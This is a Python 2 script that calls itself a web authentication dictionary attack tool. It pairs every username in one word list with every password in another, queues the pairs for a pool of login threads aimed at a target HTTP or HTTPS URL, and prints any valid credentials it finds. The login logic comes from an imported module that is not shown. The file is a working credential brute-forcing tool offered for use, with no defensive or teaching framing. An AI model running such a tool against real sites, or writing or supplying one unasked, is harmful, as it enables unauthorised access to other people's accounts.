#!/usr/bin/env python

''' Web authentication dictionary attack tool. '''

import sys
import urlparse
import itertools
import threading
import Queue

import requests

from utils import cmd_line_args
from utils import prefix_print
from utils import abort_on_missing_file
from core import LoginThread



def main():
    args = cmd_line_args()

    abort_on_missing_file(args.passwords_file)
    abort_on_missing_file(args.usernames_file)

    #check url scheme 
    if urlparse.urlparse(args.target).scheme not in ['http', 'https']:
        prefix_print("Incorrect / missing URL scheme on target \'%s\'. "
            "Only HTTP / HTTPS are supported." % (args.target), True)

    credential_queue = Queue.Queue()
    result_queue = Queue.Queue()

    thread_pool = [LoginThread(args.target, credential_queue, result_queue) for i in range(args.threads)]

    #make a big list of username / pass tuples rather than reading from file and then passing one at a time to threads
    with open(args.usernames_file) as uname_infile, open(args.passwords_file,
        'r') as pwd_infile:

        prefix_print("Loading word list from file...")
        for x in itertools.product(uname_infile, pwd_infile):
            credential_queue.put((x[0].rstrip(), x[1].rstrip())) 
        prefix_print("Loading complete.")

    for thread in thread_pool:
        thread.start()

    for thread in thread_pool:
        thread.join()

    if not result_queue.empty():
        username, password = result_queue.get()
        prefix_print("Valid Credentials: %s, %s" % (username, password))
    else:
        prefix_print("No valid credentials found.")


    '''
        if(try_credentials(args.target, x[0].rstrip(), x[1].rstrip())):
            break

    Alternate method to combine each username in the 
    username file with each password in the password file.

    itertools was ~28 seconds faster on 500 usernames x 500 passwords.

    for uname in uname_infile:
        cur_uname = uname.rstrip()
        for pwd in pwd_infile:
            cur_pwd = pwd.rstrip()
            if(try_credentials(args.target, cur_uname, cur_pwd)):
                break
        pwd_infile.seek(0);

    ''' 

if __name__ == '__main__':
    main()
